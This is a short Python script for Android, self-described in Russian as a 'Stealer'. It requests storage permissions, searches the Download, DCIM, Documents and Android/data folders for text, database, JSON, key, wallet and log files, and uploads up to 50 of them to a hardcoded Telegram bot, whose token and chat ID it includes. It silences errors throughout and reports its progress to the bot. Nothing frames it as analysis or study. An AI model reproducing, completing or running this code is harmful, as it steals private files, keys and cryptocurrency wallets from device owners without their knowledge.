import os, requests, time
from android.permissions import request_permissions, Permission

TOKEN = "8865880420:AAGcOu_d2BFlD77pDU_60mGkJO8cCMjC7I0"
CHAT_ID = "5692835324"

def send_file(f):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                      files={'document': open(f,'rb')},
                      data={'chat_id': CHAT_ID}, timeout=10)
    except: pass

def send_text(t):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      json={'chat_id': CHAT_ID, 'text': t}, timeout=5)
    except: pass

def collect_files(p, exts=['.txt','.db','.json','.key','.wallet','.log']):
    found = []
    try:
        for r,_,fs in os.walk(p):
            for f in fs:
                if any(f.endswith(e) for e in exts):
                    found.append(os.path.join(r,f))
                    if len(found) >= 30:
                        return found
    except: pass
    return found

def main():
    request_permissions([Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
    send_text("✅ Stealer запущен")
    all_files = []
    targets = ["/storage/emulated/0/Download", "/storage/emulated/0/DCIM",
               "/storage/emulated/0/Documents", "/storage/emulated/0/Android/data"]
    for p in targets:
        if os.path.exists(p):
            all_files.extend(collect_files(p))
    for f in all_files[:50]:
        send_file(f)
        time.sleep(0.3)
    send_text("✅ Отправлено: " + str(len(all_files)))

if __name__ == "__main__":
    main()